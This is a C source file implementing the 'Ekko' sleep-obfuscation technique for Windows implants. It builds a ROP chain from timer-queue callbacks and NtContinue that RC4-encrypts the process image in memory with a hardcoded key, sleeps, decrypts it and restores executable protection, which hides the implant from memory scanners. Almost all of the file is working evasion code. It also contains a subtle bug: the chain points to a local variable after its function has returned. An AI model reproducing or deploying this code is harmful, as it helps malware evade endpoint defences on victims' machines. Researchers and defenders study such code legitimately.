#include <Common.h>
#include <Ekko.h>

#define KEY_BUF_SIZE 16

void EkkoObf( DWORD sleepTime )
{
    CONTEXT ctxThread = { 0 };

    CONTEXT contexts[6] = { { 0 }, { 0 }, { 0 }, { 0 }, { 0 }, { 0 } }; 

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = CreateEventW( 0, 0, 0, 0 );
    PVOID   imageBase   = GetModuleHandleA( NULL );
    DWORD   imageSize   = ( ( PIMAGE_NT_HEADERS ) ( imageBase + ( ( PIMAGE_DOS_HEADER ) imageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
    DWORD   oldProtect  = 0;

    CHAR    keyBuf[KEY_BUF_SIZE] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
    USTRING key = { .Buffer = keyBuf, .Length = KEY_BUF_SIZE, .MaximumLength = KEY_BUF_SIZE };
    USTRING img = { .Buffer = imageBase, .Length = imageSize, .MaximumLength = imageSize };

    PVOID   NtContinue  = GetProcAddress( GetModuleHandleA( "Ntdll" ), "NtContinue" );
    PVOID   SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );

    hTimerQueue = CreateTimerQueue();

    if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, RtlCaptureContext, &ctxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
    {
        WaitForSingleObject( hEvent, 0x32 );

        for(int i = 0; i < 6; i++) {
            memcpy( &contexts[i], &ctxThread, sizeof( CONTEXT ) );
        }

        // Prepare CONTEXTs for ROP chain
        PrepareContexts(contexts, imageBase, imageSize, oldProtect, SysFunc032, &img, &key, sleepTime, hEvent);

        printf( "[INFO] Queue timers\n" );

        for(int i = 0; i < 6; i++) {
            CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &contexts[i], (i+1)*100, 0, WT_EXECUTEINTIMERTHREAD );
        }

        printf( "[INFO] Wait for hEvent\n" );

        WaitForSingleObject( hEvent, INFINITE );

        printf( "[INFO] Finished waiting for event\n" );
    }

    DeleteTimerQueue( hTimerQueue );
}

void PrepareContexts(CONTEXT* contexts, PVOID imageBase, DWORD imageSize, DWORD oldProtect, PVOID SysFunc032, USTRING* img, USTRING* key, DWORD sleepTime, HANDLE hEvent) {
    //  I have to give it to you - this ROP chain was a beast of a challenge.
    //  Let's be honest, this ROP chain was tough even with VirtualProtect.
    //  It would be beneficial for me to experiment with other Win API functions if I had more time.

    // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
    contexts[0].Rsp -= 8;
    contexts[0].Rip  = VirtualProtect;
    contexts[0].Rcx  = imageBase;
    contexts[0].Rdx  = imageSize;
    contexts[0].R8   = PAGE_READWRITE;
    contexts[0].R9   = &oldProtect;

    // SystemFunction032( &Key, &Img );
    contexts[1].Rsp -= 8;
    contexts[1].Rip  = SysFunc032;
    contexts[1].Rcx  = img;
    contexts[1].Rdx  = key;

    // WaitForSingleObject( hTargetHdl, SleepTime );
    contexts[2].Rsp  -= 8;
    contexts[2].Rip   = WaitForSingleObject;
    contexts[2].Rcx   = NtCurrentProcess();
    contexts[2].Rdx   = sleepTime;

    // SystemFunction032( &Key, &Img );
    contexts[3].Rsp  -= 8;
    contexts[3].Rip   = SysFunc032;
    contexts[3].Rcx   = img;
    contexts[3].Rdx   = key;

    // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
    contexts[4].Rsp  -= 8;
    contexts[4].Rip   = VirtualProtect;
    contexts[4].Rcx   = imageBase;
    contexts[4].Rdx   = imageSize;
    contexts[4].R8    = PAGE_EXECUTE_READWRITE;
    contexts[4].R9    = &oldProtect;

    // SetEvent( hEvent );
    contexts[5].Rsp  -= 8;
    contexts[5].Rip   = SetEvent;
    contexts[5].Rcx   = hEvent;
}

